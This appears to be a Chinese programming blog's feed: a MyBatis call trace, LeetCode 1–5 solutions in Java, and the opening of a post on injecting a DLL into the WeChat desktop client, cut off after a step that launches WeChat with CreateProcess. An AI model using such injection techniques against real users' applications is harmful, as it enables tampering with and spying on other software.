》org.apache.ibatis.executor.BaseExecutor#query(org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.session.RowBounds, org.apache.ibatis.session.ResultHandler, org.apache.ibatis.cache.CacheKey, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                》org.apache.ibatis.executor.BaseExecutor#queryFromDatabase(org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.session.RowBounds, org.apache.ibatis.session.ResultHandler, org.apache.ibatis.cache.CacheKey, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                  》org.apache.ibatis.executor.SimpleExecutor#doQuery(org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.session.RowBounds, org.apache.ibatis.session.ResultHandler, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                    》org.apache.ibatis.executor.statement.RoutingStatementHandler#RoutingStatementHandler(org.apache.ibatis.executor.Executor, org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.session.RowBounds, org.apache.ibatis.session.ResultHandler, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                      》org.apache.ibatis.session.Configuration#newParameterHandler(org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                        》org.apache.ibatis.scripting.LanguageDriver#createParameterHandler</span><br><span class="line">                        》org.apache.ibatis.plugin.InterceptorChain#pluginAll(parameterHandler)</span><br><span class="line">                      》org.apache.ibatis.session.Configuration#newResultSetHandler(org.apache.ibatis.executor.Executor, org.apache.ibatis.mapping.MappedStatement, org.apache.ibatis.session.RowBounds, org.apache.ibatis.executor.parameter.ParameterHandler, org.apache.ibatis.session.ResultHandler, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">                        》org.apache.ibatis.executor.resultset.DefaultResultSetHandler</span><br><span class="line">                        》org.apache.ibatis.plugin.InterceptorChain#pluginAll(resultSetHandler)</span><br><span class="line">                      》org.apache.ibatis.plugin.InterceptorChain#pluginAll(statementHandler)</span><br><span class="line">                    》org.apache.ibatis.executor.SimpleExecutor#prepareStatement(org.apache.ibatis.executor.statement.StatementHandler, org.apache.ibatis.logging.Log)</span><br><span class="line">                      》org.apache.ibatis.transaction.Transaction#getConnection</span><br><span class="line">                        》org.apache.ibatis.transaction.jdbc.JdbcTransaction#openConnection</span><br><span class="line">                    》org.apache.ibatis.executor.statement.StatementHandler#query(java.sql.Statement, org.apache.ibatis.session.ResultHandler)</span><br><span class="line">                      》java.sql.PreparedStatement#execute</span><br><span class="line">                      》org.apache.ibatis.executor.resultset.DefaultResultSetHandler#handleResultSets(java.sql.Statement)</span><br></pre></td></tr></table></figure>
<h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p>动态代理MapperProxy =》创建MappedStatement缓存key =》获取Executor =》分别加载parameter，resultSet，statement插件 =》 获取java.sql.Connection =》获取java.sql.Statement =》执行sql =》处理结果集</p>
<p>流程结束。</p>
<p>期待下次更新咯。:-D</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> mybatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[leetcode 0005 最长回文子串]]></title>
      <url>/2020/leetcode-0005/</url>
      <content type="html"><![CDATA[<p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<p>示例 1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br></pre></td></tr></table></figure></p>
<p>示例 2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;cbbd&quot;</span><br><span class="line">输出: &quot;bb&quot;</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>解题：</p>
<p>首先我们要了解回文是什么意思，举个例子相信大家就知道了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上海自来水来自海上</span><br><span class="line">大波美人鱼人美波大</span><br></pre></td></tr></table></figure></p>
<p>发现没有，字符串是对称的，我们可以以某一个字符为中心，分别比较左右字符是否相等，找到最大长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        if (s == null) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;illegal argument&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int length = s.length();</span><br><span class="line">        if (length == 0 || length == 1) &#123;</span><br><span class="line">            return s;</span><br><span class="line">        &#125;</span><br><span class="line">        int start = 0, end = 0;</span><br><span class="line">        for (int i = 0; i &lt; s.length(); i++) &#123;</span><br><span class="line">            int len1 = centerExpand(s, i, i);</span><br><span class="line">            int len2 = centerExpand(s, i, i + 1);</span><br><span class="line">            int len = Math.max(len1, len2);</span><br><span class="line">            if (len &gt; end - start) &#123;</span><br><span class="line">                start = i - (len - 1) / 2;</span><br><span class="line">                end = i + len / 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return s.substring(start, end + 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int centerExpand(String s, int left, int right) &#123;</span><br><span class="line">        int L = left, R = right, LEN = s.length();</span><br><span class="line">        while (L &gt;= 0 &amp;&amp; R &lt; LEN &amp;&amp; s.charAt(L) == s.charAt(R)) &#123;</span><br><span class="line">            L--;</span><br><span class="line">            R++;</span><br><span class="line">        &#125;</span><br><span class="line">        return R - L - 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后记：Manacher 算法 <a href="https://www.zhihu.com/question/37289584" target="_blank" rel="noopener">https://www.zhihu.com/question/37289584</a></p>
]]></content>
      
        <categories>
            
            <category> leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[leetcode 0004 寻找两个有序数组的中位数]]></title>
      <url>/2020/leetcode-0004/</url>
      <content type="html"><![CDATA[<p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。</p>
<p>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。<br><a id="more"></a><br>示例 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">则中位数是 2.0</span><br></pre></td></tr></table></figure></p>
<p>示例 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">则中位数是 (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">解题思路：</span><br><span class="line">由于这两个数组都是有序数组，如果我们从下标为i的地方把nums1数组分为两半，左边的数肯定比nums1[i]小，右边比nums2[i]大</span><br><span class="line">同理把nums2数组从下标为j的地方分为两半</span><br><span class="line">left                                 |  right</span><br><span class="line">nums1[0], nums1[1], ..., nums1[i-1]  |  nums1[i], nums1[i+1], ..., nums1[m-1]</span><br><span class="line">nums2[0], nums2[1], ..., nums2[j-1]  |  nums2[j], nums2[j+1], ..., nums2[n-1]</span><br><span class="line">那只要满足两个条件，我们就可以顺利找到中位数</span><br><span class="line">1. len(left)==len(right) 相当于 i+j=m-i+n-j</span><br><span class="line">2. min(right) &gt;= max(left) 相当于 nums2[j] &gt;= nums2[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]</span><br><span class="line">对于第一个条件:</span><br><span class="line">我们可以推出j = (m + n) / 2 - i，当i的值确定，j的值就确定了，也就是说我们只要把i的值确定下来满足第二个条件就行</span><br><span class="line">对于第二个条件:</span><br><span class="line">我们需要满足 nums2[j] &gt;= nums1[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]，不满足的条件有两种:</span><br><span class="line">1. nums2[j] &lt; nums1[i-1]，说明i的值太大了，你想想nums1[i]的值肯定大于nums1[i-1]，如果i继续加大，条件永远无法满足，所以要减小i</span><br><span class="line">2. nums1[i] &lt; nums2[j-1]，说明i的值太小了，需要加大i的值</span><br><span class="line">最后我们再看看满足条件nums2[j] &gt;= nums1[i-1] &amp;&amp; nums1[i] &gt;= nums2[j-1]是怎么得到中位</span><br><span class="line">max(left) = max(nums1[i-1], nums2[j-1])</span><br><span class="line">min(right) = min(nums1[i], nums1[j])</span><br><span class="line">如果数组之和是偶数，中位数 = (max(left) + min(right)) / 2</span><br><span class="line">如果数组之和是奇数，中位数 = max(left)或者min(right)，那取哪个呢，哪边多一个就取哪边</span><br><span class="line">我们可以将j = (m + n) / 2 - i改为j = (m + n + 1) / 2 - i来保证j的值大些，从而保证len(left) &gt; left(right)</span><br><span class="line">也可以将j = (m + n) / 2 - i改为j = (m + n - 1) / 2 - i来保证j的值小些，从而保证len(right) &gt; left(left)</span><br><span class="line">最后就是一些特殊情况了:</span><br><span class="line">首先由于j是由i决定的，j = (m + n) / 2 - i, i的取值范围是0到m，也就是说j可能的值是(n - m) / 2 到(m + n) / 2，由于j不能为负，那么反推m &lt;= n</span><br><span class="line"></span><br><span class="line">特殊处理:</span><br><span class="line">如果i == 0或者i == m时，nums1数组有一边是没有值的</span><br><span class="line">同理j == 0或者j == n时，nums2数组有一边也是没有值的</span><br><span class="line">*/</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123;</span><br><span class="line">        if (nums1 == null &amp;&amp; nums2 == null) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;nums1 and nums2 is null&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        int m = nums1.length;</span><br><span class="line">        int n = nums2.length;</span><br><span class="line">        // 保证 m &lt;= n</span><br><span class="line">        if (m &gt; n) &#123;</span><br><span class="line">            int[] temp = nums1;</span><br><span class="line">            nums1 = nums2;</span><br><span class="line">            nums2 = temp;</span><br><span class="line">            int tmp = m;</span><br><span class="line">            m = n;</span><br><span class="line">            n = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        int iMin = 0, iMax = m;</span><br><span class="line">        //保证len(left) &gt; len(right)</span><br><span class="line">        int halfLen = (m + n + 1) / 2;</span><br><span class="line">        while (iMin &lt;= iMax) &#123;</span><br><span class="line">            int i = (iMin + iMax) &gt;&gt;&gt; 1;</span><br><span class="line">            int j = halfLen - i;</span><br><span class="line">            // i的值太大，这里注意i的值不断减小有可能i变为0，j变为n，必须保证大于0，j也必须小于n</span><br><span class="line">            if (i &gt; iMin &amp;&amp; nums2[j] &lt; nums1[i - 1]) &#123;</span><br><span class="line">                iMax = i - 1;</span><br><span class="line">            &#125; else if (i &lt; iMax &amp;&amp; nums1[i] &lt; nums2[j - 1]) &#123; // i 的值太小</span><br><span class="line">                iMin = i + 1;</span><br><span class="line">            &#125; else &#123;  // i的值刚好</span><br><span class="line">                int maxLeft = 0;</span><br><span class="line">                // 特殊情况i == 0，数组nums1的left为空，只能取nums2的left的最大值</span><br><span class="line">                if (i == 0) &#123;</span><br><span class="line">                    maxLeft = nums2[j - 1];</span><br><span class="line">                &#125; else if (j == 0) &#123;</span><br><span class="line">                    maxLeft = nums1[i - 1];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    maxLeft = Math.max(nums1[i - 1], nums2[j - 1]);</span><br><span class="line">                &#125;</span><br><span class="line">                if ((m + n) % 2 == 1) &#123;</span><br><span class="line">                    return maxLeft;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                int minRight = 0;</span><br><span class="line">                if (i == m) &#123;</span><br><span class="line">                    minRight = nums2[j];</span><br><span class="line">                &#125; else if (j == n) &#123;</span><br><span class="line">                    minRight = nums1[i];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    minRight = Math.min(nums2[j], nums1[i]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return (maxLeft + minRight) / 2.0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0.0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[leetcode 0003 无重复字符的最长子串]]></title>
      <url>/2020/leetcode-0003/</url>
      <content type="html"><![CDATA[<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。<br><a id="more"></a><br>示例 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure></p>
<p>示例 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure></p>
<p>示例 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure></p>
<p>解题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int lengthOfLongestSubstring(String s) &#123;</span><br><span class="line">        int len = s.length();</span><br><span class="line">        int index = 0;</span><br><span class="line">        int max = 0;</span><br><span class="line">        while (index &lt; len) &#123;</span><br><span class="line">            Map&lt;Character, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">            int currMax = 0;</span><br><span class="line">            for (int i = index; i &lt; len; i++) &#123;</span><br><span class="line">                char c = s.charAt(i);</span><br><span class="line">                if (map.containsKey(c)) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    map.put(c, null);</span><br><span class="line">                    currMax++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (currMax &gt; max) &#123;</span><br><span class="line">                max = currMax;</span><br><span class="line">            &#125;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        return max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[leetcode 0002 两数相加]]></title>
      <url>/2020/leetcode-0002/</url>
      <content type="html"><![CDATA[<p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。<br><a id="more"></a><br>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 = 807</span><br></pre></td></tr></table></figure></p>
<p>解题：</p>
<ol>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * public class ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode next;</span><br><span class="line"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123;</span><br><span class="line">        ListNode root = new ListNode(0);</span><br><span class="line">        ListNode cursor = root;</span><br><span class="line">        int carry = 0;</span><br><span class="line">        while(l1 != null || l2 != null || carry != 0) &#123;</span><br><span class="line">            int l1Val = l1 != null ? l1.val : 0;</span><br><span class="line">            int l2Val = l2 != null ? l2.val : 0;</span><br><span class="line">            int sumVal = l1Val + l2Val + carry;</span><br><span class="line">            carry = sumVal / 10;</span><br><span class="line">            </span><br><span class="line">            ListNode sumNode = new ListNode(sumVal % 10);</span><br><span class="line">            cursor.next = sumNode;</span><br><span class="line">            cursor = sumNode;</span><br><span class="line">            </span><br><span class="line">            if(l1 != null) l1 = l1.next;</span><br><span class="line">            if(l2 != null) l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return root.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>先把两个链表转成数字，然后相加，注意溢出（BigInteger）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import java.math.BigInteger;</span><br><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * public class ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode next;</span><br><span class="line"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123;</span><br><span class="line">        StringBuilder sb1 = new StringBuilder().append(l1.val);</span><br><span class="line">        ListNode temp = l1;</span><br><span class="line">        while (temp.next != null) &#123;</span><br><span class="line">            temp = temp.next;</span><br><span class="line">            sb1.append(temp.val);</span><br><span class="line">        &#125;</span><br><span class="line">        BigInteger i1 = new BigInteger(sb1.reverse().toString());</span><br><span class="line"></span><br><span class="line">        StringBuilder sb2 = new StringBuilder().append(l2.val);</span><br><span class="line">        temp = l2;</span><br><span class="line">        while (temp.next != null) &#123;</span><br><span class="line">            temp = temp.next;</span><br><span class="line">            sb2.append(temp.val);</span><br><span class="line">        &#125;</span><br><span class="line">        BigInteger i2 = new BigInteger(sb2.reverse().toString());</span><br><span class="line"></span><br><span class="line">        BigInteger sum = i1.add(i2);</span><br><span class="line">        String sumStr = sum.toString();</span><br><span class="line">        ListNode result = new ListNode(Integer.parseInt(sumStr.charAt(sumStr.length() - 1) + &quot;&quot;));</span><br><span class="line">        ListNode tempResult = result;</span><br><span class="line">        for (int i = sumStr.length() - 2; i &gt;= 0; i--) &#123;</span><br><span class="line">            tempResult.next = new ListNode(Integer.parseInt(sumStr.charAt(i) + &quot;&quot;));</span><br><span class="line">            tempResult = tempResult.next;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[leetcode 0001 两数之和]]></title>
      <url>/2020/leetcode-0001/</url>
      <content type="html"><![CDATA[<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
<a id="more"></a>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<p>解题：</p>
<p>这道题目只能暴力破解，匹配两个数相加，然后得出索引</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int[] twoSum(int[] nums, int target) &#123;</span><br><span class="line">        int len = nums.length;</span><br><span class="line">        for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">            for (int j = i + 1; j &lt; len; j++) &#123;</span><br><span class="line">                if (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    return new int[]&#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new int[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PC微信助手]]></title>
      <url>/2020/pcwechat_helper/</url>
      <content type="html"><![CDATA[<h2 id="注入dll到微信"><a href="#注入dll到微信" class="headerlink" title="注入dll到微信"></a>注入dll到微信</h2><h3 id="0x0-首先要打开微信进程"><a href="#0x0-首先要打开微信进程" class="headerlink" title="0x0 首先要打开微信进程"></a>0x0 首先要打开微信进程</h3><a id="more"></a>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> wxPath[] = <span class="string">L"C:\\Program Files (x86)\\Tencent\\WeChat\\WeChat.exe"</span>;</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">si.wShowWindow = SW_SHOW;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">BOOL bCp = CreateProcess(<span class="literal">NULL</span>, wxPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (bCp == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  MessageBox(<span class="literal">NULL</span>, <span class="string">L"启动微信失败"</span>, <span class="string">L"错误"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
